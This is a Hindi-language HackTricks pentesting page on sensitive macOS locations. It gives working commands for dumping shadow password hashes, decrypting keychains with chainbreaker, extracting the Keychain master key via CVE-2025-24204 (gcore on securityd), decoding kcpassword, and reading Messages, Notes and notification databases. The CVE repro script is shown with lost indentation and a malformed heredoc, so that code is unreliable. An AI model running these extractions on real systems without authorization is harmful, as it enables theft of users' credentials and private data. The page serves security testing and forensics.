# macOS संवेदनशील स्थान और दिलचस्प Daemons

{{#include ../../../banners/hacktricks-training.md}}

## पासवर्ड

### Shadow Passwords

Shadow password को user's configuration के साथ **`/var/db/dslocal/nodes/Default/users/`** में स्थित plists में store किया जाता है।\
निम्नलिखित oneliner का उपयोग **users के बारे में सभी information** (hash info सहित) dump करने के लिए किया जा सकता है:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**इस तरह के Scripts**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) या [**इस Script**](https://github.com/octomagon/davegrohl.git) का उपयोग hash को **hashcat** **format** में बदलने के लिए किया जा सकता है।

एक वैकल्पिक one-liner, जो सभी non-service accounts के creds को hashcat format `-m 7100` (macOS PBKDF2-SHA512) में dump करेगा:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
किसी user का `ShadowHashData` प्राप्त करने का एक अन्य तरीका `dscl` का उपयोग करना है: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

यह file **केवल तब उपयोग की जाती है** जब system id **single-user mode** में चल रहा हो (इसलिए बहुत कम बार)।

### Keychain Dump

ध्यान दें कि passwords को **decrypted रूप में dump** करने के लिए security binary का उपयोग करते समय, user से इस operation की अनुमति देने के लिए कई prompts पूछे जाएंगे।
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
आधुनिक macOS पर सबसे interesting backing stores आमतौर पर **`~/Library/Keychains/login.keychain-db`** और **`/Library/Keychains/System.keychain`** होते हैं। ये SQLite-backed files हैं, लेकिन plaintext access अभी भी **`securityd`** द्वारा brokered होता है: raw DB चुराने से मुख्य रूप से metadata और encrypted blobs ही मिलते हैं, जब तक कि आप user का password, `SystemKey`, या memory में मौजूद master key भी recover न कर लें।<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> इस comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) के आधार पर ऐसा लगता है कि ये tools अब Big Sur में काम नहीं कर रहे हैं।

### Keychaindump Overview

**keychaindump** नाम का एक tool macOS keychains से passwords extract करने के लिए विकसित किया गया है, लेकिन [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) में बताए अनुसार, नए macOS versions जैसे Big Sur पर इसकी limitations हैं। **keychaindump** के उपयोग के लिए attacker को access प्राप्त करके privileges को **root** तक escalate करना आवश्यक है। यह tool इस तथ्य का फायदा उठाता है कि convenience के लिए user login के समय keychain default रूप से unlocked होता है, जिससे applications को user का password बार-बार मांगे बिना उस तक access मिल जाता है। हालांकि, यदि user हर use के बाद अपने keychain को lock करने का विकल्प चुनता है, तो **keychaindump** ineffective हो जाता है।

**Keychaindump** एक specific process **securityd** को target करके operate करता है, जिसे Apple authorization और cryptographic operations के लिए daemon के रूप में describe करता है और जो keychain तक access के लिए महत्वपूर्ण है। Extraction process में user के login password से derived **Master Key** को identify करना शामिल है। यह key keychain file को पढ़ने के लिए आवश्यक है। **Master Key** का पता लगाने के लिए, **keychaindump** `vmmap` command का उपयोग करके **securityd** के memory heap को scan करता है और उन areas में potential keys खोजता है जिन्हें `MALLOC_TINY` के रूप में flag किया गया है। इन memory locations का inspection करने के लिए निम्न command का उपयोग किया जाता है:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
संभावित master keys की पहचान करने के बाद, **keychaindump** heaps में एक विशिष्ट pattern (`0x0000000000000018`) खोजता है, जो master key के candidate का संकेत देता है। इस key का उपयोग करने के लिए deobfuscation सहित आगे के steps आवश्यक हैं, जैसा कि **keychaindump** के source code में बताया गया है। इस क्षेत्र पर ध्यान केंद्रित करने वाले analysts को ध्यान रखना चाहिए कि keychain को decrypt करने के लिए महत्वपूर्ण data **securityd** process की memory में stored होता है। **keychaindump** चलाने के लिए एक example command है:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) का उपयोग OSX keychain से निम्नलिखित प्रकार की जानकारी को forensically sound तरीके से extract करने के लिए किया जा सकता है:

- Hashed Keychain password, जिसे [hashcat](https://hashcat.net/hashcat/) या [John the Ripper](https://www.openwall.com/john/) से crack किया जा सकता है
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain unlock password, [volafox](https://github.com/n0fate/volafox) या [volatility](https://github.com/volatilityfoundation/volatility) से प्राप्त master key, या SystemKey जैसी unlock file मिलने पर Chainbreaker plaintext passwords भी प्रदान करेगा।

Keychain को unlock करने के इन तरीकों में से किसी एक के बिना, Chainbreaker उपलब्ध अन्य सभी जानकारी प्रदर्शित करेगा।

#### **Keychain keys dump करें**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey के साथ keychain keys (passwords के साथ) Dump करें**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **hash crack करके keychain keys (passwords के साथ) Dump करना**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **memory dump के साथ keychain keys (passwords सहित) Dump करें**

**memory dump** करने के लिए [इन चरणों का पालन करें](../index.html#dumping-memory-with-osxpmem)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **users password का उपयोग करके keychain keys (passwords के साथ) dump करें**

यदि आपको user का password पता है, तो आप इसका उपयोग **user से संबंधित keychains को dump और decrypt करने** के लिए कर सकते हैं।
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement के ज़रिए Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia) में `/usr/bin/gcore` को **`com.apple.system-task-ports.read`** entitlement के साथ ship किया गया था, इसलिए कोई भी local admin (या malicious signed app) SIP/TCC लागू होने पर भी **किसी भी process की memory dump** कर सकता था। `securityd` को dump करने से **Keychain master key** clear में leak हो जाती है और user password के बिना `login.keychain-db` को decrypt किया जा सकता है।<sup>[[1]](#references)</sup>

**Vulnerable builds (15.0–15.2) पर quick repro:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Extracted hex key को Chainbreaker (`--key <hex>`) में feed करके login keychain को decrypt करें। Apple ने **macOS 15.3+** में entitlement हटा दिया है, इसलिए यह केवल unpatched Sequoia builds या उस vulnerable binary को बनाए रखने वाले systems पर काम करता है।

### kcpassword

**kcpassword** file में **user का login password** होता है, लेकिन केवल तब जब system owner ने **automatic login** enable किया हो। इसलिए user से password पूछे बिना वह automatically logged in हो जाएगा (जो बहुत secure नहीं है)।

Password **`/etc/kcpassword`** file में key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** के साथ xored रूप में stored होता है। यदि users का password key से लंबा है, तो key को दोबारा उपयोग किया जाएगा।\
इससे password recover करना काफी आसान हो जाता है, उदाहरण के लिए [**इस script**](https://gist.github.com/opshope/32f65875d45215c3677d) का उपयोग करके।

## Databases में रोचक Information

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### सूचनाएं

**`Sequoia`** से पहले, आप आमतौर पर Notification Center store को **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** में पा सकते हैं। **`Sequoia+`** में Apple ने इसे TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** में स्थानांतरित कर दिया।

अधिकांश उपयोगी जानकारी **`blob`** columns के अंदर संग्रहीत होती है, इसलिए आपको उस content को extract करके human-readable रूप में transform करना होगा (`plutil -p -`, `strings`, या कोई छोटा parser)। Quick triage examples:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### हालिया privacy issues (NotificationCenter DB)

- macOS **14.7–15.1** में Apple ने `db2/db` SQLite में banner content को उचित redaction के बिना store किया। CVEs **CVE-2024-44292/44293/40838/54504** के कारण कोई भी local user केवल DB खोलकर अन्य users का notification text पढ़ सकता था (किसी TCC prompt के बिना)।
- Apple ने नए Sequoia builds में DB को `group.com.apple.usernoted` में ले जाकर और TCC से protect करके इसे mitigate किया है। इसलिए current systems पर इसे पढ़ने के लिए सामान्यतः सही user context या TCC bypass की आवश्यकता होती है।<sup>[[3]](#references)</sup>
- Legacy endpoints पर, यदि आप artefacts को preserve करना चाहते हैं, तो updating या rebooting से पहले `db`, `db-wal` और `db-shm` files को एक साथ copy करें।

### नोट्स

Users के **notes** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में मिल सकते हैं.
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
यदि ऊपर दिया गया **one-liner** बहुत अधिक noisy हो, तो `ZICNOTEDATA.ZDATA` को export करें, उसे gunzip करें, और protobuf को parse करें: यह सीधे SQLite पर `strings` चलाने की तुलना में आमतौर पर अधिक reliable होता है।

### Background Tasks / Login Items

**Ventura** के बाद से, user-approved Login Items और कई background tasks को **BTM** stores में track किया जाता है, जैसे **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** और versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**।

ये files persistence, helper tools और कुछ MDM-managed background items की तुरंत पहचान करने के लिए उपयोगी हैं:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Persistence angle और BTM internals के लिए [the auto-start locations page](../../macos-auto-start-locations.md#login-items) और [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management) देखें।

## Preferences

macOS apps में preferences **`$HOME/Library/Preferences`** में स्थित होती हैं और iOS में वे `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` में होती हैं।

macOS में cli tool **`defaults`** का उपयोग **Preferences file को modify करने** के लिए किया जा सकता है।

**`/usr/sbin/cfprefsd`** XPC services `com.apple.cfprefsd.daemon` और `com.apple.cfprefsd.agent` को claim करता है और preferences को modify करने जैसी actions करने के लिए call किया जा सकता है।

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` file में node attributes पर लागू permissions होती हैं और यह SIP द्वारा protected है।\
यह file specific users को uid के बजाय UUID द्वारा permissions प्रदान करती है, ताकि वे `ShadowHashData`, `HeimdalSRPKey` और `KerberosKeys` जैसी अन्य sensitive information तक access कर सकें:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Notifications के लिए मुख्य daemon **`/usr/sbin/notifyd`** है। Notifications प्राप्त करने के लिए clients को `com.apple.system.notification_center` Mach port के माध्यम से register करना आवश्यक है (इन्हें `sudo lsmp -p <pid notifyd>` से check करें)। यह daemon `/etc/notify.conf` file से configurable है।

Notifications के लिए उपयोग किए जाने वाले names unique reverse DNS notations होते हैं, और जब इनमें से किसी एक को notification भेजा जाता है, तो वे client(s) जिन्होंने इसे handle करने में सक्षम होने का संकेत दिया है, उसे प्राप्त करेंगे।

notifyd process को SIGUSR2 signal भेजकर और generated file `/var/run/notifyd_<pid>.status` को पढ़कर current status dump करना (और सभी names देखना) संभव है:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**, जिसका मुख्य binary **`/usr/sbin/distnoted`** है, notifications भेजने का एक और तरीका है। यह कुछ XPC services expose करता है और clients को verify करने का प्रयास करने के लिए कुछ checks करता है।

### Apple Push Notifications (APN)

इस मामले में applications **topics** के लिए register कर सकती हैं। Client **`apsd`** के माध्यम से Apple के servers से संपर्क करके एक token generate करेगा।\
इसके बाद, providers ने भी एक token generate किया होगा और वे clients को messages भेजने के लिए Apple के servers से connect कर सकेंगे। ये messages स्थानीय रूप से **`apsd`** द्वारा receive किए जाएंगे, जो notification को उसके लिए प्रतीक्षा कर रही application तक relay करेगा।

Preferences `/Library/Preferences/com.apple.apsd.plist` में स्थित हैं।

macOS में messages का एक local database `/Library/Application\ Support/ApplePushService/aps.db` में और iOS में `/var/mobile/Library/ApplePushService` में स्थित है। इसमें 3 tables हैं: `incoming_messages`, `outgoing_messages` और `channel`।
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Daemon और connections के बारे में जानकारी प्राप्त करना भी संभव है:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

ये वे notifications हैं जिन्हें user को screen पर देखना चाहिए:

- **`CFUserNotification`**: ये API screen पर message के साथ एक pop-up दिखाने का तरीका प्रदान करती हैं।
- **The Bulletin Board**: यह iOS में एक ऐसा banner दिखाता है जो गायब हो जाता है और Notification Center में store हो जाता है।
- **`NSUserNotificationCenter`**: यह MacOS में iOS का bulletin board है। पुराने macOS releases में database आमतौर पर `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` में रहता है; Sequoia+ पर इसे `~/Library/Group Containers/group.com.apple.usernoted/db2/db` में move किया गया।

## References

- [1] [HelpNetSecurity – macOS gcore entitlement ने Keychain master key extraction की अनुमति दी (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple ने macOS Sequoia में Notification Center database से जुड़ी privacy concerns का समाधान किया](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
